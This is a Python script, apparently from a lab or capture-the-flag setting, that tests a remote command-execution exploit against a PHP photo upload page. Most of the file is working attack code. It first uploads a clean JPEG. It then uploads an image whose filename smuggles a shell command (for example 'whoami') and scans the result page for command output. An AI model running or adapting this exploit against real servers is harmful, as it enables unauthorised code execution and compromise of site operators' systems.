#!/usr/bin/env python3
"""
Quick test to verify our JPEG generation works with PHP's image functions
"""

import requests
import tempfile
import os
from PIL import Image
import io

def create_test_jpeg():
    """Create a proper JPEG that PHP can read"""
    img = Image.new('RGB', (50, 50), color='red')
    buffer = io.BytesIO()
    img.save(buffer, format='JPEG', quality=85)
    buffer.seek(0)
    return buffer.getvalue()

def test_normal_upload(target_url):
    """Test a normal upload first to make sure our image works"""
    print("[*] Testing normal image upload first...")
    
    image_data = create_test_jpeg()
    
    files = {'photo': ('test.jpg', image_data, 'image/jpeg')}
    data = {'title': 'Normal Test', 'description': 'Testing normal upload'}
    
    try:
        response = requests.post(f"{target_url}/upload.php", files=files, data=data)
        print(f"[*] Normal upload status: {response.status_code}")
        
        if response.status_code == 302:
            print("[+] Normal upload works! Image is valid.")
            return True
        else:
            print(f"[-] Normal upload failed: {response.text[:200]}")
            return False
            
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

def test_exploit(target_url, command="id"):
    """Test the exploit with proper image"""
    print(f"[*] Testing exploit with command: {command}")
    
    # Create valid image
    image_data = create_test_jpeg()
    
    # Malicious filename
    malicious_filename = f'test.jpg"; {command}; echo "'
    print(f"[*] Malicious filename: {malicious_filename}")
    
    files = {'photo': (malicious_filename, image_data, 'image/jpeg')}
    data = {'title': 'RCE Test', 'description': 'Command injection test'}
    
    try:
        response = requests.post(f"{target_url}/upload.php", files=files, data=data)
        print(f"[*] Exploit response status: {response.status_code}")
        
        if response.status_code == 302:
            print("[+] SUCCESS! Exploit upload accepted")
            location = response.headers.get('Location', '')
            print(f"[+] Redirect: {location}")
            
            # Try to get the result page
            if location and not location.startswith('http'):
                result_url = target_url + ('/' + location if not location.startswith('/') else location)
                try:
                    result = requests.get(result_url)
                    print(f"[*] Result page status: {result.status_code}")
                    if "metadata" in result.text.lower():
                        print("[+] Found metadata section - check for command output!")
                        # Look for our command output in the response
                        if command in result.text or "root" in result.text or "www-data" in result.text:
                            print("[+] Possible command output detected in response!")
                except Exception as e:
                    print(f"[!] Could not fetch result: {e}")
            
            return True
        else:
            print(f"[-] Exploit failed: {response.status_code}")
            print(f"[-] Response: {response.text[:300]}")
            return False
            
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python3 test_image.py <target_url> [command]")
        sys.exit(1)
    
    target_url = sys.argv[1].rstrip('/')
    command = sys.argv[2] if len(sys.argv) > 2 else "whoami"
    
    print("=" * 50)
    print("Testing Image Upload RCE Exploit")
    print("=" * 50)
    
    # First test normal upload
    if test_normal_upload(target_url):
        print()
        # Then test exploit
        test_exploit(target_url, command)
    else:
        print("[!] Normal upload failed - check your target URL and server")
